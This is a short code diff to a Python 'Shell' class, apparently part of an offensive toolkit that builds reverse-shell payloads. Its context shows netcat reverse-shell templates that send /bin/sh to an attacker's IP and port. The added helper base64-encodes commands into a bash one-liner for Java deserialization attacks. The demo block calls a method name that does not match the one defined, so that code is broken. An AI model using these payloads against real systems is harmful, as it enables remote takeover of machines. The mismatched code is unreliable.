@@ -78,7 +78,7 @@ class Shell(object):
     Generate Shell for use
     """
 
-    def __init__(self, stype):
+    def __init__(self, stype="php"):
         super(Shell, self).__init__()
         self.stype = stype
         self.phpShells = [
@@ -111,3 +111,16 @@ class Shell(object):
             "nc -e /bin/sh %s %s" % (ip, port),
             "/bin/sh | nc %s %s" % (ip, port),
         ]
+
+    @staticmethod
+    def b64BashCommand(command):
+        # for Java Unserialize Attack
+        # prevent transferred by Runtime.getRuntime().exec()
+        template = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}'
+        return template % command.encode("base64").strip()
+
+
+if __name__ == '__main__':
+    s = Shell()
+    print(s.reverse("127.0.0.1", "8888"))
+    print(s.b64ShellCommand("ls"))
